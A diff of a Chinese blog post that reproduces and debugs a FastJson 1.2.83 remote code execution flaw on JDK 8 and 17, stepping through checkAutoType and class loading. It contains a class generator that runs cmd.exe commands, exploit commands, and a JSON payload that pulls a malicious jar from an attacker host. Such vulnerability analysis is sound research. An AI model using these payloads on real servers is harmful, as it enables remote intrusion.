clinit.visitInsn(Opcodes.ICONST_3);</span><br><span class="line">    clinit.visitTypeInsn(Opcodes.ANEWARRAY, <span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">    clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_0);</span><br><span class="line">    clinit.visitLdcInsn(<span class="string">&quot;cmd.exe&quot;</span>); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">    clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_1);</span><br><span class="line">    clinit.visitLdcInsn(<span class="string">&quot;/c&quot;</span>); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">    clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_2);</span><br><span class="line">    clinit.visitLdcInsn(cmd); clinit.visitInsn(Opcodes.AASTORE);</span><br><span class="line">    clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)Ljava/lang/Process;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    clinit.visitInsn(Opcodes.POP);</span><br><span class="line">    clinit.visitInsn(Opcodes.RETURN);</span><br><span class="line">    clinit.visitMaxs(<span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    clinit.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
 <p>配置调试：</p>
-<p>java  -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;y,address&#x3D;5005  -jar target&#x2F;fastjson-rce-env-1.0.0.jar</p>
+<blockquote>
+<p>java -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;y,address&#x3D;5005 -jar target&#x2F;fastjson-rce-env-1.0.0.jar</p>
+</blockquote>
 <p>IDEA 配置远程调试</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784790751189-4d193ea0-cd43-4840-8c55-1df5181e728a.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1.png" alt="image.png"></p>
 <h3 id="java-1-8-调试"><a href="#java-1-8-调试" class="headerlink" title="java 1.8 调试"></a>java 1.8 调试</h3><p>构造：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash scripts/build.sh localhost <span class="number">19090</span> <span class="string">&quot;open -a Calculator&quot;</span> jdk8-http</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784821248262-dd136a05-c374-4d63-928c-afb9c7f9bd31.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2.png" alt="image.png"></p>
 <p>一键攻击攻击：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc/exploit.py localhost <span class="number">19090</span> http:<span class="comment">//127.0.0.1:18080 /parse --mode jdk8-http --once</span></span><br></pre></td></tr></table></figure>
 
 <p>直接在这里打断点</p>
 <p>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</p>
 <p>typeName传进来的值就是请求恶意地址的值</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784817459404-7e00e7f1-69ec-43b0-9bc1-8f85275a86e3.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3.png" alt="image.png"></p>
 <p>autoTypeCheckHandlers为空直接跳过，这个可以理解为用户允许某个 @type 能不能反序列化，默认没有设置就直接跳过来，如果设置有的话，后面所有 SafeMode &#x2F; 黑白名单 &#x2F; 内置安全校验全部跳过。然后走到safemode，没开的话，默认就是关的，然后就是黑白名单过滤了。</p>
+<blockquote>
 <p><strong>注意</strong>：safemode是在1.2.68中添加的，打开后就完全禁用autoype（即@type），这样就能防御fastjson反序列化了</p>
+</blockquote>
 <p>直接走到这，将类型名中的 . 替换为 &#x2F;，追加 .class 后缀，所以http:..localhost:19090.a—-》<a target="_blank" rel="noopener" href="http://localhost:19090/a.class">http://localhost:19090/a.class</a></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784821138718-ec8dbb6b-171d-406c-b2d8-27af7797705f.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4.png" alt="image.png"></p>
 <p>然后走到这里，尝试用 ClassLoader 获取资源流，跟进getResourceAsStream</p>
-<p><strong>注意：</strong> getResourceAsStream 的类加载器要能识别 jar: 协议、把 jar:http:&#x2F;&#x2F;… &#x2F; jar:file:&#x2F;proc&#x2F;self&#x2F;fd&#x2F;N! 真的当 URL 打开；同一个（或具备等价能力的）加载器 要能对读到的字节流调用 defineClass，<strong>Spring Boot fat-jar 的 LaunchedURLClassLoader 恰好同时满足这两点，所以</strong></p>
+<blockquote>
+<p><strong>注意：</strong> getResourceAsStream 的类加载器要能识别 jar: 协议、把 jar:<a target="_blank" rel="noopener" href="http://.../">http:&#x2F;&#x2F;…</a> &#x2F; jar:file:&#x2F;proc&#x2F;self&#x2F;fd&#x2F;N! 真的当 URL 打开；同一个（或具备等价能力的）加载器 要能对读到的字节流调用 defineClass，<strong>Spring Boot fat-jar 的 LaunchedURLClassLoader 恰好同时满足这两点，所以</strong></p>
+</blockquote>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784821552836-4d256bf7-e28c-4fa0-b1a5-1f8f45e2256e.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784860222136-e97caf96-b535-4cf1-aa90-572a9a818616.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5.png" alt="image.png"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6.png" alt="image.png"></p>
 <p>判断点在这里getResource，继续跟进getResource，双亲委派的方式，自上而下资源查找，如果资源存在就返回地址，</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> URL <span class="title function_">getResource</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    URL url;</span><br><span class="line">    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">        url = parent.getResource(name);     <span class="comment">// 1. 委托父加载器</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        url = getBootstrapResource(name);   <span class="comment">// 2. Bootstrap 加载器</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url == <span class="literal">null</span>) &#123;</span><br><span class="line">        url = findResource(name);           <span class="comment">// 3. 自己找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784862015747-a95d8303-1612-4118-8d5f-370c2468bfea.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7.png" alt="image.png"></p>
 <p>然后回到java.net.URLClassLoader#getResourceAsStream，发起url连接，获取资源流，然后返回</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLConnection</span> <span class="variable">urlc</span> <span class="operator">=</span> url.openConnection(); <span class="comment">//发起连接的一步</span></span><br><span class="line">urlc.getInputStream();	<span class="comment">//读取数据</span></span><br></pre></td></tr></table></figure>
 
 <p>JVM 会根据 URL 的协议，选择合适的 <code>URLStreamHandler</code>，于 JarURLConnection： 这一步会解析 JAR 文件结构，定位到 POC.class 的字节码，拿到了 POC.class</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784863124467-2d185d67-b38e-4610-853f-e9e5c4aec535.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8.png" alt="image.png"></p>
 <p>用 ASM 扫描字节码中的 @JSONType 注解，检查POC.class 有 <code>@JSONType</code> 注解，又就返回true</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">    classReader.accept(visitor);</span><br><span class="line">    jsonType = visitor.hasJsonType();          <span class="comment">// ★ 检查是否有 @JSONType</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864251803-3694b9c9-149a-4b9e-ab0b-0f50bc1eaca0.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9.png" alt="image.png"></p>
 <p>可以跟进hasJsonType看一下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> AnnotationVisitor <span class="title function_">visitAnnotation</span><span class="params">(String desc, <span class="type">boolean</span> visible)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;</span>.equals(desc)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.jsonType = <span class="literal">true</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.visitAnnotation(desc, visible);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864556758-528019ea-2939-452b-9d33-519cf02db7ad.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864618293-54fcfe39-9859-4a34-8554-3935b72e4e93.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10.png" alt="image.png"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11.png" alt="image.png"></p>
 <p>然后走完前面的，就到了这里，加载类，然后返回类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784864730980-1a53ea58-1f6f-421e-bf60-0d344ed8655d.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-12.png" alt="image.png"></p>
 <p>返回类之后回到这里，继续往下走</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880113496-4ac0ff41-6175-4bbe-a262-d4f8ce477440.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-13.png" alt="image.png"></p>
 <p>走到这里，跟进，里面触发newInstance()，动使用类，触发初始化</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instance = TypeUtils.cast(object, clazz, <span class="built_in">this</span>.config);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880245165-dfadb9de-0bdb-4bc7-b4db-300f7fd0c30b.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-14.png" alt="image.png"></p>
 <p>最终走到newInstance()，然后初始化poc触发了静态方法</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880279490-5fec09d3-311d-4d6e-af46-31d86e83d88e.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880362920-5cd65dec-fad2-473e-91ea-8dd2dafee904.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784880397876-4b66ecba-699a-4d5f-adea-caa8c53c2fc4.png" alt="img"></p>
-<h3 id="java17-调试"><a href="#java17-调试" class="headerlink" title="java17 调试"></a>java17 调试</h3><p>JDK 9+ 模块化后，<code>http:</code> 协议不再被 <code>URLClassLoader.getResourceAsStream</code> 直接支持，但 <code>jar:http:</code> 仍然可以（先下载远程 jar，再从 jar 中提取资源）</p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-15.png" alt="image.png"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-16.png" alt="image.png"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-17.png" alt="image.png"></p>
+<h3 id="java17-调试"><a href="#java17-调试" class="headerlink" title="java17 调试"></a>java17 调试</h3><blockquote>
+<p>JDK 9+ 模块化后，<code>http:</code> 协议不再被 <code>URLClassLoader.getResourceAsStream</code> 直接支持，但 <code>jar:http:</code> 仍然可以（先下载远程 jar，再从 jar 中提取资源）</p>
+</blockquote>
 <p>手打payload：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;jar:http:..3232252414:19090.probe!.foo.Exception&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;jar:file:.proc.self.fd.3!.fd3.Exception&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;jar:file:.proc.self.fd.4!.fd4.Exception&quot;</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
@@ -371,53 +389,53 @@
 <h4 id="第一阶段：下载-jar，创建-fd-缓存"><a href="#第一阶段：下载-jar，创建-fd-缓存" class="headerlink" title="第一阶段：下载 jar，创建 fd 缓存"></a>第一阶段：下载 jar，创建 fd 缓存</h4><p>继续在com.alibaba.fastjson.parser.ParserConfig#checkAutoType打断点，第一阶段还是一样</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName=jar:http:..localhost:<span class="number">19090.</span>probe!.foo.Exception</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785464267189-54a378ca-6709-4e0f-b843-3b311c45c728.png" alt="img"></p>
-<p>getRootJarFileFromUrl(url) 会下载远程 jar（<a target="_blank" rel="noopener" href="http://host:19090/probe%EF%BC%89%E5%88%B0">http://host:19090/probe）到</a> &#x2F;tmp&#x2F;jar_cache*.tmp，打开该文件，然后删除磁盘文件但保持 fd 打开，当s 非 null &#x3D; JVM 成功下载了远程 jar 并从中读取了.class 的字节流。这一刻，”缓存”已经在 OS 层形成了。</p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-18.png" alt="image.png"></p>
+<p>getRootJarFileFromUrl(url) 会下载远程 jar（<a target="_blank" rel="noopener" href="http://host:19090/probe">http://host:19090/probe</a>）到 &#x2F;tmp&#x2F;jar_cache*.tmp，打开该文件，然后删除磁盘文件但保持 fd 打开，当s 非 null &#x3D; JVM 成功下载了远程 jar 并从中读取了.class 的字节流。这一刻，”缓存”已经在 OS 层形成了。</p>
 <p>Linux 的 &#x2F;proc 文件系统为每个进程维护了一个符号链接目录 &#x2F;proc&#x2F;self&#x2F;fd&#x2F;，其中每个条目指向该进程打开的文件描述符–即使文件已被从磁盘删除。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785465105424-f3d397f7-6eff-4aa7-a799-31b9740ab2cc.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-19.png" alt="image.png"></p>
 <p>识别 <code>jar:</code> 协议并决定去哪里读数据”的地方。阶段一时，这里内部会发起 HTTP 请求下载 jar → <strong>这就是”缓存”形成的时刻</strong>。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785465826205-7f557133-ea47-42cd-a678-7064c38eacd1.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785465797996-caeefbf3-59c0-4afe-a568-8d585f5ec657.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-20.png" alt="image.png"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-21.png" alt="image.png"></p>
 <p>可以直接查看容器中的&#x2F;tmp目录，是有缓存</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> % docker <span class="built_in">exec</span> fj-jdk17-rce sh -c \</span><br><span class="line">    <span class="string">&#x27;ls -la /proc/1/fd/ | grep jar_cache&#x27;</span></span><br><span class="line">lr-x------ 1 root root 64 Aug  3 03:27 15 -&gt; /tmp/jar_cache9866597154988054067.tmp (deleted)</span><br></pre></td></tr></table></figure>
-
-
 
 <h4 id="阶段二：-从-fd-读取恶意类"><a href="#阶段二：-从-fd-读取恶意类" class="headerlink" title="阶段二： 从 fd 读取恶意类"></a>阶段二： 从 fd 读取恶意类</h4><p>前面流程都一样，走到这里加资源流。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785043566075-87607c03-b853-4f67-bec7-2a90bba88eaf.png" alt="img"></p>
-<p>跟前面一样，jsonType&#x3D;true 导致 TypeUtils.loadClass(typeName, …) 被调用，最终走到 defineClass </p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-22.png" alt="image.png"></p>
+<p>跟前面一样，jsonType&#x3D;true 导致 TypeUtils.loadClass(typeName, …) 被调用，最终走到 defineClass</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">    boolean cacheClass = autoTypeSupport || jsonType;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1785749859161-a4c1ba19-773c-45da-9b31-486c30d716b6.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-23.png" alt="image.png"></p>
 <h3 id="java8和java17的区别："><a href="#java8和java17的区别：" class="headerlink" title="java8和java17的区别："></a>java8和java17的区别：</h3><p>真正的差异在 JVM Native 层（C++ 代码），ClassFileParser 解析类的内部名称时进行校验。</p>
 <p>JDK 8 的 classFileParser.cpp 中 verify_unqualified_name 函数：</p>
+<blockquote>
 <p>规则：禁止类名中出现 [ 、 . 、 ; 等特殊字符</p>
 <p>结果：&#x2F;&#x2F;（连续斜杠）不在禁止列表中</p>
-<p>因此 JDK 8 直接接受类名 <a target="_blank" rel="noopener" href="http://1.2.3.4:19090/foo/Exception%EF%BC%8CdefineClass">http://1.2.3.4:19090/foo/Exception，defineClass</a> 成功。</p>
+<p>因此 JDK 8 直接接受类名 <a target="_blank" rel="noopener" href="http://1.2.3.4:19090/foo/Exception">http://1.2.3.4:19090/foo/Exception</a>，defineClass 成功。</p>
+</blockquote>
